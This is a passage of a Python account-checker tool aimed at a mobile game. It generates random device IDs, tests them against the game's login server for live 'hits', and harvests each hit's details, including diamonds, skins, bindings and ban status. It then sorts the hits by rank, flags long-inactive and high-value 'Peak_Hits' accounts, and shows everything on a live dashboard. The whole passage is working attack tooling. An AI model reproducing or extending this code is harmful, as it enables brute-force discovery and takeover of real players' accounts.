            line = (f'{_MG}{g}{_RST}  {_WH}{_BRT}{val}{_RST}  '
                    f'{_WH}{trunc(name, 16)}{_RST}')
            if extra:
                line += f'  {extra}'
            rows.append(f'  {line}')
        return rows


    def _latest(self, W):
        if not self.focus:
            return []
        age = time.time() - self.focus_ts
        if age > self.focus_ttl:
            return []
        inner = W - 4
        rows = [self._section(W, 'LATEST HIT')]
        for kind, val in self.focus:
            if kind == 'title':
                rows.append(f'  {_WH}{_BRT}{trunc(val, W - 4)}{_RST}')
            else:
                k, v = val
                rows.append(
                    f'  {_DIM}{pad_right(k, 10)}{_RST}  '
                    f'{_WH}{trunc(v, W - 16)}{_RST}'
                )
        return rows

    def _build_focus(self, p):
        lm = p.get('last_match') or {}
        sb = p.get('skin_breakdown') or {}
        acc = p.get('_account', 0)
        zone = p.get('_zone', 0)
        nick = fv(p.get('nickname'), '?')
        rows = []
        rows.append(('title', f'{self.GSTAR} {nick}  \u00b7  acc {acc} z {zone}'))
        rows.append(('kv', 'rank',
                     f"{fv(p.get('current_rank'), '?')}   peak {fv(p.get('high_rank'), '?')}"))
        rows.append(('kv', 'level',
                     f"{fv(p.get('level'), 0)}   wr {fv(p.get('win_rate'), '?')}   "
                     f"{commas(p.get('total_battles', 0))}B   {fv(p.get('account_age'), '-')}"))
        rows.append(('kv', 'collector',
                     f"{fv(p.get('collector_tier'), '?')}  ({commas(p.get('collector_point', 0))})"))
        rows.append(('kv', 'status',
                     f"v2l {fv(p.get('v2l_status'), '?')}   "
                     f"ban {fv(p.get('ban_status'), '?')}   "
                     f"starlight {fv(p.get('starlight_user'), '?')}"))
        rows.append(('kv', 'skins',
                     f"S{sb.get('Supreme Skins', 0)}  G{sb.get('Grand Skins', 0)}  "
                     f"Ex{sb.get('Exquisite Skins', 0)}  D{sb.get('Deluxe Skins', 0)}  "
                     f"X{sb.get('Exceptional Skins', 0)}  C{sb.get('Common Skins', 0)}"))
        if lm:
            rows.append(('kv', 'last',
                         f"{lm.get('hero', '?')}  {lm.get('kda', '?')}  "
                         f"{lm.get('result', '?')}   {fv(lm.get('played_at'), '?')}"))
        return rows

    
    def _feed_header(self, W):
        head = ' LIVE FEED '
        tail = max(0, W - 6 - vlen(head))
        return [f'  {_CY}[{_RST} {_WH}{_BRT}LIVE FEED{_RST} {_CY}]{_RST} '
                f'{_DIM}{"═" * tail}{_RST}']

    def _feed(self, W, n_rows, events):
        tail = events[-n_rows:]
        if not tail:
            rows = [f'  {_DIM}waiting for first result...{_RST}']
            for _ in range(n_rows - 1):
                rows.append('')
            return rows
        out = []
        for _ in range(max(0, n_rows - len(tail))):
            out.append('')
        for ts, kind, text in tail:
            out.append(self._feed_line(W, ts, kind, text))
        return out

    def _feed_line(self, W, ts, kind, text):
        glyph, color = _FEED_STYLES.get(kind, ('\u00b7', _DIM))
        t = datetime.datetime.fromtimestamp(ts).strftime('%H:%M:%S')
        left = f'  {_DIM}{t}{_RST}  {color}{_BRT}{glyph}{_RST}  '
        avail = max(8, W - vlen(left) - 1)
        return left + trunc(text, avail)


def items_ok(parts):
    return parts

RANK_FOLDERS = [
    ('Warrior',           ('Warrior',)),
    ('Elite',             ('Elite',)),
    ('Master',            ('Master',)),
    ('Grandmaster',       ('Grandmaster',)),
    ('Epic',              ('Epic',)),
    ('Legend',            ('Legend',)),
    ('Mythic',            ('Mythic',)),
    ('Mythical Honor',    ('Mythical Honor',)),
    ('Mythical Glory',    ('Mythical Glory',)),
    ('Mythical Immortal', ('Mythical Immortal',)),
]

PEAK_TIERS = {
    'world':    'World Collector',
    'mega':     'Mega Collector',
    'exalted':  'Exalted Collector',
    'renowned': 'Renowned Collector',
    'expert':   'Expert Collector',
}
def rank_folder_for(rank_str):
    if not rank_str:
        return None
    for folder, prefixes in RANK_FOLDERS:
        for prefix in prefixes:
            if rank_str.startswith(prefix):
                return folder
    return None

def _trash_worker(dash, device_id, handles, lock):
    res = probe_device(device_id)
    st = res.get('status')

    if st == 'banned':
        with lock:
            handles['banned'].write(device_id + '\n')
        dash.bump('invalid')
        dash.bump('banned')
        dash.bump('banned_hits')
        dash.push('ban', f'{trunc(device_id, 30)}  banned')
        dash.bump('done')
        return

    if st != 'clean':
        with lock:
            handles['invalid'].write(device_id + '\n')
        dash.bump('error')
        dash.bump('fail')
        dash.push('fail', f'{trunc(device_id, 30)}  {res.get("error", "?")}')
        dash.bump('done')
        return

    lvl = as_int(res.get('level', 0))
    if lvl <= 7:
        with lock:
            handles['level'].write(device_id + '\n')
        dash.bump('dropped')
        dash.bump('dropped_low')
        dash.bump('low_level')
        dash.push('drop', f'{trunc(device_id, 30)}  lv{lvl}')
        dash.bump('done')
        return

    rank = res.get('rank', '')
    if not rank or rank == 'Unranked':
        with lock:
            handles['unranked'].write(device_id + '\n')
        dash.bump('dropped')
        dash.bump('dropped_unranked')
        dash.push('drop', f'{trunc(device_id, 30)}  unranked')
        dash.bump('done')
        return

    with lock:
        handles['clean'].write(device_id + '\n')
    dash.bump('ok')
    dash.bump('clean')
    dash.bump('valid')
    dash.bump('clean_hits')
    dash.push('clean', f'{trunc(device_id, 30)}  lv{lvl}  {rank}')
    dash.bump('done')
def run_trash_remover():
    section('Banned + Trash Remover')
    print()
    bullet('drop level 7 and below', color=_YL)
    bullet('drop banned accounts', color=_RD)
    bullet('drop unranked / no rank', color=_YL)
    bullet('drop lookup failures', color=_YL)
    bullet('output: clean_device.txt with raw device ids', color=_GN)
    print()

    path = pick_file(hint='file with device ids, one per line')
    if not path:
        return

    try:
        ids = load_id_file(path)
    except Exception as e:
        log('ERROR', f'read failed: {e}')
        press_enter()
        return

    if not ids:
        log('ERROR', 'no device ids in file')
        press_enter()
        return

    threads_in = ask('threads', default='8')
    try:
        threads = max(1, min(32, int(threads_in)))
    except ValueError:
        threads = 8

    os.makedirs(TRASH_DIR, exist_ok=True)
    handles = {
        'clean':    open(os.path.join(TRASH_DIR, 'clean_device.txt'), 'w', encoding='utf-8'),
        'banned':   open(os.path.join(TRASH_DIR, 'dropped_banned.txt'), 'w', encoding='utf-8'),
        'level':    open(os.path.join(TRASH_DIR, 'dropped_level.txt'), 'w', encoding='utf-8'),
        'unranked': open(os.path.join(TRASH_DIR, 'dropped_unranked.txt'), 'w', encoding='utf-8'),
        'invalid':  open(os.path.join(TRASH_DIR, 'dropped_invalid.txt'), 'w', encoding='utf-8'),
    }
    lock = threading.Lock()

    dash = LiveDash(total=len(ids), label=f'trash remover / {os.path.basename(path)}')
    dash.start()

    start = time.time()
    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(_trash_worker, dash, d, handles, lock) for d in ids]
            for _ in as_completed(futures):
                pass
    except KeyboardInterrupt:
        dash.stop()
        raise
    finally:
        dash.stop()
        for fh in handles.values():
            try:
                fh.close()
            except Exception:
                pass

    elapsed = time.time() - start
    with dash.mu:
        s = dict(dash.s)

    print()
    cw = card_width(2)
    card_a = (Card('Summary', width=cw)
              .kv('scanned', commas(len(ids)))
              .kv('elapsed', human_dur(elapsed))
              .kv('rate', f'{len(ids)/max(elapsed,0.001):.1f}/s')
              .sep()
              .kv('kept clean', commas(s['clean']), vc=_GN))
    card_b = (Card('Buckets', width=cw)
              .kv('valid', commas(s.get('valid', 0)), vc=_GN)
              .kv('invalid', commas(s.get('invalid', s.get('banned', 0))), vc=_RD)
              .kv('error', commas(s.get('error', s.get('fail', 0))), vc=_YL)
              .kv('dropped', commas(s.get('dropped', 0)), vc=_YL)
              .sep()
              .kv('clean hits', commas(s.get('clean_hits', 0)), vc=_GN)
              .kv('banned hits', commas(s.get('banned_hits', 0)), vc=_RD)
              .kv('low level (<=7)', commas(s.get('low_level', 0)), vc=_YL))
    pair(card_a, card_b)

    divider()
    log('SUCCESS', f'clean list: {os.path.join(TRASH_DIR, "clean_device.txt")}')
    log('INFO', f'drops saved under {os.path.basename(TRASH_DIR)}/')
    press_enter()

def _rank_worker(dash, device_id, handles, lock):
    res = probe_device(device_id)
    st = res.get('status')

    if st == 'banned':
        dash.bump('invalid')
        dash.bump('banned')
        dash.bump('banned_hits')
        dash.bump('done')
        dash.push('ban', f'{trunc(device_id, 30)}  banned')
        return

    if st != 'clean':
        dash.bump('error')
        dash.bump('fail')
        dash.bump('done')
        dash.push('fail', f'{trunc(device_id, 30)}  {res.get("error", "?")}')
        return

    rank = res.get('rank', '')
    folder = rank_folder_for(rank)
    if not folder:
        dash.bump('dropped')
        dash.bump('done')
        dash.push('drop', f'{trunc(device_id, 30)}  no rank folder')
        return

    lts = res.get('last_login_ts', 0)
    if lts:
        try:
            last_dt = datetime.datetime.fromtimestamp(lts, datetime.timezone.utc)
            now = datetime.datetime.now(datetime.timezone.utc)
            days = (now - last_dt).days
        except Exception:
            days = 999
    else:
        days = 999

    sub = 'inactive_1-14d' if days < 15 else 'inactive_15d_up'
    key = (folder, sub)

    with lock:
        h = handles['rank'].get(key)
        if h is None:
            fdir = os.path.join(RANK_DIR, folder, sub)
            os.makedirs(fdir, exist_ok=True)
            h = open(os.path.join(fdir, 'ids.txt'), 'w', encoding='utf-8')
            handles['rank'][key] = h
        h.write(device_id + '\n')

    tier = res.get('collector_tier', '') or ''
    for pk, pname in PEAK_TIERS.items():
        if tier.startswith(pname):
            with lock:
                handles['peak'][pk].write(device_id + '\n')
            dash.bump('peak')
            break

    lvl = as_int(res.get('level', 0))
    if lvl <= 7:
        dash.bump('low_level')

    dash.bump('ok')
    dash.bump('clean')
    dash.bump('valid')
    dash.bump('clean_hits')
    dash.push('clean', f'{trunc(device_id, 30)}  {rank}  {sub}')
    dash.bump('done')
def run_rank_categorizer():
    section('Rank Categorizer')
    print()
    bullet('scan ids, sort into per-rank folders', color=_CY)
    bullet('inactive_1-14d.txt and inactive_15d_up.txt inside each', color=_CY)
    bullet('premium collector tiers also copied to Peak_Hits/', color=_MG)
    bullet('output: raw device ids, one per line', color=_GN)
    print()

    path = pick_file(hint='file with device ids (e.g. clean_device.txt)')
    if not path:
        return

    try:
        ids = load_id_file(path)
    except Exception as e:
        log('ERROR', f'read failed: {e}')
        press_enter()
        return

    if not ids:
        log('ERROR', 'no device ids in file')
        press_enter()
        return

    threads_in = ask('threads', default='8')
    try:
        threads = max(1, min(32, int(threads_in)))
    except ValueError:
        threads = 8

    if os.path.exists(RANK_DIR):
        try:
            existing = sum(1 for _ in os.listdir(RANK_DIR))
        except OSError:
            existing = 0
        if existing:
            ans = ask(f'rank_split/ has {existing} entries - overwrite? (y/N)',
                      default='n')
            if ans.lower() not in ('y', 'yes'):
                log('WARNING', 'aborted - kept existing rank_split/')
                return
        shutil.rmtree(RANK_DIR, ignore_errors=True)
    os.makedirs(RANK_DIR, exist_ok=True)
    os.makedirs(os.path.join(RANK_DIR, 'Peak_Hits'), exist_ok=True)

    peak_dir = os.path.join(RANK_DIR, 'Peak_Hits')
    handles = {
        'rank': {},
        'peak': {pk: open(os.path.join(peak_dir, f'{pk}.txt'), 'w', encoding='utf-8')
                 for pk in PEAK_TIERS},
    }
    lock = threading.Lock()

    dash = LiveDash(total=len(ids), label=f'rank sort / {os.path.basename(path)}')
    dash.start()

    start = time.time()
    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(_rank_worker, dash, d, handles, lock) for d in ids]
            for _ in as_completed(futures):
                pass
    except KeyboardInterrupt:
        dash.stop()
        raise
    finally:
        dash.stop()
        for h in handles['rank'].values():
            try:
                h.close()
            except Exception:
                pass
        for h in handles['peak'].values():
            try:
                h.close()
            except Exception:
                pass

    elapsed = time.time() - start
    with dash.mu:
        s = dict(dash.s)

    print()
    cw = card_width(2)
    card_a = (Card('Summary', width=cw)
              .kv('scanned', commas(len(ids)))
              .kv('elapsed', human_dur(elapsed))
              .kv('rate', f'{len(ids)/max(elapsed,0.001):.1f}/s')
              .sep()
              .kv('sorted', commas(s['clean']), vc=_GN)
              .kv('peak hits', commas(s['peak']), vc=_MG))
    card_b = (Card('Buckets', width=cw)
              .kv('valid', commas(s.get('valid', 0)), vc=_GN)
              .kv('invalid', commas(s.get('invalid', s.get('banned', 0))), vc=_RD)
              .kv('error', commas(s.get('error', s.get('fail', 0))), vc=_YL)
              .kv('dropped', commas(s.get('dropped', 0)), vc=_YL)
              .sep()
              .kv('clean hits', commas(s.get('clean_hits', 0)), vc=_GN)
              .kv('banned hits', commas(s.get('banned_hits', 0)), vc=_RD)
              .kv('low level (<=7)', commas(s.get('low_level', 0)), vc=_YL))
    pair(card_a, card_b)

    divider()
    log('SUCCESS', f'output: {RANK_DIR}')
    press_enter()

def pick_rank_file():
    if not os.path.isdir(RANK_DIR):
        log('ERROR', 'rank_split folder not found - run rank categorizer first')
        return None

    entries = []
    for rn in sorted(os.listdir(RANK_DIR)):
        rp = os.path.join(RANK_DIR, rn)
        if not os.path.isdir(rp):
            continue
        for fname in sorted(os.listdir(rp)):
            if not fname.endswith('.txt'):
                continue
            fp = os.path.join(rp, fname)
            try:
                sz = os.path.getsize(fp)
                with open(fp, 'r', encoding='utf-8') as f:
                    n = sum(1 for ln in f if ln.strip())
            except OSError:
                sz = 0
                n = 0
            entries.append((rn, fname, fp, sz, n))

    if not entries:
        log('ERROR', 'no files inside rank_split')
        return None

    print()
    print(f'  {_CY}rank_split{_RST}')
    for i, (rn, fn, fp, sz, n) in enumerate(entries, 1):
        c = palette('aurora')[i % 4]
        label = f'{rn}/{fn}'
        print(f'  {hex_ansi(c)}[{i:>2}]{_RST}  '
              f'{_WH}{pad_right(label, 42)}{_RST}  '
              f'{_DIM}{n:>5} ids  {human_bytes(sz)}{_RST}')
    print()
    print(f'  {_DIM}enter number or q to cancel{_RST}')

    try:
        raw = input(f'  {_CY}>{_RST} ').strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return None

    if not raw or raw.lower() == 'q':
        return None
    if raw.isdigit():
        idx = int(raw)
        if 1 <= idx <= len(entries):
            return entries[idx - 1][2]
    return None

def _kvline(key, val, w=17):
    return f"    {key:<{w}} {val}"

def _build_save_block(pd, hit_num):
    sb = pd.get('skin_breakdown', {})
    ban = pd.get('ban_status', 'CLEAN')

    lines = [
        "=" * 68,
        f"  FULL INFO #{hit_num:03d}",
        "=" * 68,
        "",
        "  [ account ]",
        _kvline("device id", pd.get('_device', '')),
        _kvline("account id", pd.get('_account', 0)),
        _kvline("zone id", pd.get('_zone', 0)),
        _kvline("name", fv(pd.get('nickname'))),
        _kvline("level", fv(pd.get('level'), 0)),
        _kvline("region", fv(pd.get('region_country'))),
        _kvline("location", fv(pd.get('location'))),
        _kvline("bindings", fv(pd.get('bindings'))),
        _kvline("last login", fv(pd.get('last_login'))),
        _kvline("created", fv(pd.get('creation_date'))),
        _kvline("account age", fv(pd.get('account_age'))),
        "",
        "  [ ban status ]",
        _kvline("status", ban),
    ]
    if ban == 'BANNED':
        lines.extend([
            _kvline("reason", fv(pd.get('ban_reason'), 'unknown')),
            _kvline("ban code", fv(pd.get('ban_code'), '-')),
            _kvline("duration", fv(pd.get('ban_duration'), '-')),
        ])

    lines.extend([
        "",
        "  [ progress ]",
        _kvline("current rank", fv(pd.get('current_rank'))),
        _kvline("highest rank", fv(pd.get('high_rank'))),
        _kvline("achievement pts", commas(pd.get('achievement_points', 0))),
        _kvline("collector tier", fv(pd.get('collector_tier'))),
        _kvline("collector points", commas(pd.get('collector_point', 0))),
        _kvline("mcl wins", commas(pd.get('mcl_champion_wins', 0))),
        _kvline("total battles", commas(pd.get('total_battles', 0))),
        _kvline("win rate", fv(pd.get('win_rate'))),
        "",
        "  [ inventory ]",
        _kvline("heroes", commas(pd.get('hero_count', 0))),
        _kvline("skins", commas(pd.get('skin_count', 0))),
        _kvline("diamonds", commas(pd.get('diamonds', 0))),
        _kvline("battle points", commas(pd.get('battle_points', 0))),
        _kvline("tickets", commas(pd.get('tickets', 0))),
        "",
        "  [ skin breakdown ]",
        _kvline("supreme", sb.get('Supreme Skins', 0)),
        _kvline("grand", sb.get('Grand Skins', 0)),
        _kvline("exquisite", sb.get('Exquisite Skins', 0)),
        _kvline("deluxe", sb.get('Deluxe Skins', 0)),
        _kvline("exceptional", sb.get('Exceptional Skins', 0)),
        _kvline("common", sb.get('Common Skins', 0)),
        "",
        "  [ social ]",
        _kvline("followers", commas(pd.get('followers', 0))),
        _kvline("likes", commas(pd.get('likes', 0))),
        _kvline("affinity", fv(pd.get('affinity'))),
        _kvline("credits score", fv(pd.get('credits_score'))),
        _kvline("squad", fv(pd.get('squad'))),
        _kvline("squad motto", fv(pd.get('squad_motto'))),
        "",
        "  [ status ]",
        _kvline("v2l", fv(pd.get('v2l_status'), 'Unknown')),
        _kvline("starlight", fv(pd.get('starlight_user'))),
        _kvline("starlight expiry", fv(pd.get('starlight_expiry'))),
        _kvline("starlight months", fv(pd.get('starlight_months'), 0)),
        _kvline("restriction", fv(pd.get('restriction_flags'), 'None')),
        _kvline("last diamond buy", fv(pd.get('last_diamond_purchase'))),
        "",
        "  [ extras ]",
        _kvline("latest skin", fv(pd.get('latest_skin_id'))),
        _kvline("latest skin date", fv(pd.get('latest_skin_date'))),
    ])

    lm = pd.get('last_match')
    if lm:
        lines.extend([
            "",
            "  [ last match ]",
            _kvline("hero", lm.get('hero', '?')),
            _kvline("result", lm.get('result', '?')),
            _kvline("mode", lm.get('mode', '?')),
            _kvline("kda", lm.get('kda', '?')),
            _kvline("kda ratio", lm.get('kda_ratio', 0)),
            _kvline("duration", lm.get('duration', '?')),
            _kvline("gold", commas(lm.get('gold', 0))),
            _kvline("mvp", "yes" if lm.get('mvp') else "no"),
            _kvline("played", fv(lm.get('played_at'))),
        ])

    lh = pd.get('last_heroes_purchase') or []
    lines.append(_kvline("heroes bought", ", ".join(lh) if lh else "-"))

    em = pd.get('emblem_levels') or []
    lines.append(_kvline("emblems", ", ".join(em) if em else "-"))

    sh = pd.get('skin_history') or []
    if sh:
        lines.append("")
        lines.append("  [ skin history ]")
        for entry in sh:
            lines.append(f"    {entry}")

    hh = pd.get('hero_history') or []
    if hh:
        lines.append("")
        lines.append("  [ hero history ]")
        lines.append(f"    {', '.join(hh)}")

    lines.append("")
    lines.append("=" * 68)
    return "\n".join(lines)

_info_hit_lock = threading.Lock()
_hit_counter = [0]

def _format_hit_line(n, pd):
    lm = pd.get('last_match') or {}
    lm_txt = (f"{lm.get('hero','?')} {lm.get('kda','?')} "
              f"{lm.get('result','?')} {lm.get('mode','?')}") if lm else '-'
    return (
        f"{n:04d} | {pd.get('_device','')} | "
        f"{fv(pd.get('nickname'), '?'):<16} | "
        f"{fv(pd.get('current_rank'), '?'):<20} | "
        f"lv{as_int(pd.get('level', 0)):<3} | "
        f"{pd.get('ban_status','?'):<6} | "
        f"v2l={fv(pd.get('v2l_status'), '?'):<8} | "
        f"lm: {lm_txt}"
    )

def _write_last_match(n, pd):
    lm = pd.get('last_match')
    if not lm:
        return
    append_line(FILE_LAST_MATCHES,
                f"{n:04d} | {pd.get('_device','')} | "
                f"{fv(pd.get('nickname'), '?'):<16} | "
                f"{fv(lm.get('played_at'), '?'):<17} | "
                f"{lm.get('hero', '?'):<14} | "
                f"{lm.get('result', '?'):<4} | "
                f"{lm.get('kda', '?'):<11} | "
                f"{lm.get('mode', '?'):<8} | "
                f"{lm.get('duration', '?')}")

def _info_worker(dash, device_id):
    res = fetch_info_by_device(device_id)

    if res.get('status') != 'success':
        err = res.get('error', 'unknown')
        dash.record_fail(device_id, err)
        dash.bump('error')
        append_line(FILE_ERRORS, f"{device_id} | {err}")
        return

    player = res['player']
    player['_device'] = res.get('device_id', device_id)
    player['_account'] = res.get('account_id', 0)
    player['_zone'] = res.get('zone_id', 0)

    with _info_hit_lock:
        _hit_counter[0] += 1
        n = _hit_counter[0]

    dash.record_hit(device_id,
                    player['_account'],
                    player['_zone'],
                    player)
    if hasattr(dash, 'record_panel_data'):
        try:
            dash.record_panel_data(player)
        except Exception:
            pass

    block = _build_save_block(player, n)
    append_block(FILE_VALID, block)
    append_line(FILE_HITS, _format_hit_line(n, player))
    _write_last_match(n, player)

    if player.get('ban_status') == 'BANNED':
        append_line(FILE_BAN,
                    f"{device_id} | reason: {player.get('ban_reason', '?')} "
                    f"| duration: {player.get('ban_duration', '?')}")
    else:
        append_line(FILE_CLEAN,
                    f"{device_id} | account {player['_account']} | zone {player['_zone']}")

    v2l = str(player.get('v2l_status', '')).lower()
    if v2l in ('enabled', 'yes', '1', 'true'):
        append_block(FILE_V2L_YES, block)
    else:
        append_block(FILE_V2L_NO, block)
def bulk_info_check(path, threads):
    try:
        device_ids = load_id_file(path)
    except Exception as e:
        log('ERROR', f'read failed: {e}')
        return

    if not device_ids:
        log('ERROR', 'no device ids in file')
        return

    with _info_hit_lock:
        _hit_counter[0] = 0

    dash = LiveDash(total=len(device_ids), label=f'full info / {os.path.basename(path)}')
    dash.start()

    start = time.time()
    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(_info_worker, dash, d) for d in device_ids]
            for _ in as_completed(futures):
                pass
    except KeyboardInterrupt:
        dash.stop()
        raise
    finally:
        dash.stop()

    elapsed = time.time() - start
    with dash.mu:
        s = dict(dash.s)
        hits = _hit_counter[0]

    print()
    cw = card_width(2)
    card_a = (Card('Summary', width=cw)
              .kv('processed', commas(s['done']))
              .kv('hits', commas(hits))
              .kv('elapsed', human_dur(elapsed))
              .kv('rate', f'{s["done"]/max(elapsed,0.001):.1f}/s'))
    card_b = (Card('Buckets', width=cw)
              .kv('valid', commas(s.get('valid', s.get('ok', 0))), vc=_GN)
              .kv('invalid', commas(s.get('invalid', s.get('banned', 0))), vc=_RD)
              .kv('error', commas(s.get('error', s.get('fail', 0))), vc=_YL)
              .kv('dropped', commas(s.get('dropped', 0)), vc=_YL)
              .sep()
              .kv('clean hits', commas(s.get('clean_hits', s.get('clean', 0))), vc=_GN)
              .kv('banned hits', commas(s.get('banned_hits', s.get('banned', 0))), vc=_RD)
              .kv('low level (<=7)', commas(s.get('low_level', 0)), vc=_YL))
    pair(card_a, card_b)

    divider()
    log('INFO', f'saved: {os.path.basename(FILE_VALID)}')
    log('INFO', f'saved: {os.path.basename(FILE_HITS)}')
    log('INFO', f'saved: {os.path.basename(FILE_V2L_YES)}')
    log('INFO', f'saved: {os.path.basename(FILE_V2L_NO)}')
    log('INFO', f'saved: {os.path.basename(FILE_LAST_MATCHES)}')
    log('INFO', f'saved: {os.path.basename(FILE_BAN)}')
    log('INFO', f'saved: {os.path.basename(FILE_CLEAN)}')

def run_merge_extract():
    section('Merge + Device ID Extractor')
    print()
    bullet('point it at a folder OR a single file', color=_CY)
    bullet('walks the whole tree, every .txt/.csv/.log/.tsv', color=_CY)
    bullet('extracts every valid device id, dedupes', color=_CY)
    bullet('output: merge_clean_ids.txt', color=_GN)
    print()

    try:
        raw = input(f'  {_CY}path>{_RST} ').strip().strip('"').strip("'")
    except (EOFError, KeyboardInterrupt):
        print()
        return

    if not raw:
        return

    target = os.path.expanduser(raw)
    if not os.path.exists(target):
        log('ERROR', f'path not found: {target}')
        press_enter()
        return

    exts = ('.txt', '.csv', '.log', '.tsv')

    files = []
    if os.path.isfile(target):
        files.append(target)
    else:
        for root, dirs, names in os.walk(target):
            for n in names:
                if n.lower().endswith(exts):
                    files.append(os.path.join(root, n))

    if not files:
        log('ERROR', f'no .txt/.csv/.log/.tsv files under {target}')
        press_enter()
        return

    print()
    log('INFO', f'scanning {len(files)} file(s) under {target}')
    print()

    all_ids = []
    seen = set()
    per_file = []
    sp = Spinner('extracting').start()
    try:
        for p in files:
            ids = extract_device_ids_from_file(p)
            kept = 0
            for d in ids:
                if d not in seen:
                    seen.add(d)
                    all_ids.append(d)
                    kept += 1
            if kept:
                per_file.append((p, len(ids), kept))
    finally:
        sp.stop()

    if not all_ids:
        log('ERROR', 'no valid device ids found')
        press_enter()
        return

    out_path = os.path.join(OUT_DIR, 'merge_clean_ids.txt')
    with open(out_path, 'w', encoding='utf-8') as f:
        for d in all_ids:
            f.write(d + '\n')

    print()
    cw = card_width(2)
    card_a = (Card('Summary', width=cw)
              .kv('files scanned', commas(len(files)))
              .kv('files with ids', commas(len(per_file)))
              .kv('total hits', commas(sum(n for _, n, _ in per_file)))
              .kv('unique ids', commas(len(all_ids)), vc=_GN))
    card_b = (Card('Top files', width=cw))
    top = sorted(per_file, key=lambda x: x[2], reverse=True)[:6]
    for p, n, kept in top:
        label = os.path.basename(p)[:18] or p[-18:]
        card_b.kv(label, f'{kept} ids')
    if len(per_file) > 6:
        card_b.kv('...', f'+{len(per_file) - 6} more')
    pair(card_a, card_b)

    divider()
    log('SUCCESS', f'wrote {len(all_ids)} unique ids -> {out_path}')
    press_enter()

def _gen_hex(n):
    return ''.join(random.choice('0123456789abcdef') for _ in range(n))

def _gen_alnum(n):
    pool = 'abcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(pool) for _ in range(n))

def generate_device_ids(count):
    out = []
    for _ in range(count):
        imei = _gen_hex(32)
        android = _gen_alnum(16)
        adid = '-'.join((
            _gen_hex(8), _gen_hex(4), _gen_hex(4),
            _gen_hex(4), _gen_hex(12),
        ))
        out.append(f'and_{imei}{android}{adid}')
    return out

def _validate_one(d, hits, lock, dash):
    try:
        res = probe_device(d)
    except Exception:
        res = {'status': 'error'}
    st = res.get('status')
    with lock:
        if st in ('clean', 'banned'):
            hits.append((d, res))
        dash.bump('done')
        if st == 'clean':
            dash.bump('clean')
            dash.push('clean', f'{trunc(d, 30)}  lv{res.get("level", 0)}  {res.get("rank", "?")}')
        elif st == 'banned':
            dash.bump('banned')
            dash.push('ban', f'{trunc(d, 30)}  banned')
        else:
            dash.bump('fail')

def run_device_generator():
    section('Device ID Generator')
    print()
    bullet('format matches the game: and_<md5><android><adid>', color=_CY)
    bullet('expect 5-10% live hits across a batch', color=_YL)
    print()
    print(f'  {_DIM}mode:{_RST}')
    print(f'    {_CY}[1]{_RST} generate only')
    print(f'    {_CY}[2]{_RST} generate + validate (scan live, keep hits)')
    print(f'    {_CY}[q]{_RST} cancel')
    print()

    try:
        mode = input(f'  {_CY}>{_RST} ').strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        return

    if mode in ('q', '') or mode not in ('1', '2'):
        return

    count_in = ask('how many', default='100')
    try:
        count = max(1, min(100000, int(count_in)))
    except ValueError:
        count = 100

    prefix = ask('filename prefix', default='gen').strip() or 'gen'
    prefix = re.sub(r'[^A-Za-z0-9_\-]', '_', prefix)[:32]

    sp = Spinner(f'generating {count}').start()
    try:
        ids = generate_device_ids(count)
    finally:
        sp.stop()

    if mode == '1':
        fname = f'{prefix}_{count}.txt'
        out_path = os.path.join(OUT_DIR, fname)
        with open(out_path, 'w', encoding='utf-8') as f:
            for d in ids:
                f.write(d + '\n')
        print()
        cw = card_width(2)
        card = (Card('Generated', width=cw)
                .kv('count', commas(count))
                .kv('file', fname)
                .kv('size', human_bytes(os.path.getsize(out_path)))
                .sep()
                .kv('est. hits', f'~{count // 20}-{count // 10}', vc=_GN))
        stack(card, per_row=1)
        divider()
        log('SUCCESS', f'wrote {count} ids -> {out_path}')
        press_enter()
        return

    threads_in = ask('threads', default='12')
    try:
        threads = max(1, min(32, int(threads_in)))
    except ValueError:
        threads = 12

    raw_path = os.path.join(OUT_DIR, f'{prefix}_{count}_raw.txt')
    with open(raw_path, 'w', encoding='utf-8') as f:
        for d in ids:
            f.write(d + '\n')

    print()
    log('INFO', f'testing {count} ids against the login server...')
    print()

    hits = []
    lock = threading.Lock()
    dash = LiveDash(total=len(ids), label=f'validate / {prefix}')
    dash.start()

    start = time.time()
    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(_validate_one, d, hits, lock, dash) for d in ids]
            for _ in as_completed(futures):
                pass
    except KeyboardInterrupt:
        dash.stop()
        raise
    finally:
        dash.stop()

    elapsed = time.time() - start

    clean_ct = sum(1 for _, r in hits if r.get('status') == 'clean')
    ban_ct   = sum(1 for _, r in hits if r.get('status') == 'banned')

    hit_path = os.path.join(OUT_DIR, f'{prefix}_{count}_hits.txt')
    with open(hit_path, 'w', encoding='utf-8') as f:
        for d, _ in hits:
            f.write(d + '\n')

    clean_path = os.path.join(OUT_DIR, f'{prefix}_{count}_clean.txt')
    with open(clean_path, 'w', encoding='utf-8') as f:
        for d, r in hits:
            if r.get('status') == 'clean':
                f.write(d + '\n')

    ban_path = os.path.join(OUT_DIR, f'{prefix}_{count}_banned.txt')
    with open(ban_path, 'w', encoding='utf-8') as f:
        for d, r in hits:
            if r.get('status') == 'banned':
                f.write(d + '\n')

    print()
    cw = card_width(2)
    card_a = (Card('Validation', width=cw)
              .kv('tested', commas(len(ids)))
              .kv('hits', commas(len(hits)), vc=_GN)
              .kv('elapsed', human_dur(elapsed))
              .kv('rate', f'{len(ids)/max(elapsed,0.001):.1f}/s'))
    card_b = (Card('Breakdown', width=cw)
              .kv('clean', commas(clean_ct), vc=_GN)
              .kv('banned', commas(ban_ct), vc=_RD)
              .kv('miss', commas(len(ids) - len(hits)), vc=_YL)
              .sep()
              .kv('hit rate', f'{len(hits)/max(len(ids),1)*100:.1f}%', vc=_MG))
    pair(card_a, card_b)

    divider()
    log('INFO',    f'raw:   {raw_path}')
    log('INFO',    f'clean: {clean_path}')
    log('INFO',    f'banned:{ban_path}')
    log('SUCCESS', f'hits:  {hit_path}  ({len(hits)} ids)')
    press_enter()

def menu_bulk_info():
    section('Bulk Full Info')
    print()
    print(f'  {_DIM}source:{_RST}')
    print(f'    {_CY}[1]{_RST} nearby / pasted file')
    print(f'    {_CY}[2]{_RST} pick from rank_split folder')
    print(f'    {_CY}[q]{_RST} cancel')
    print()

    try:
        src = input(f'  {_CY}>{_RST} ').strip()
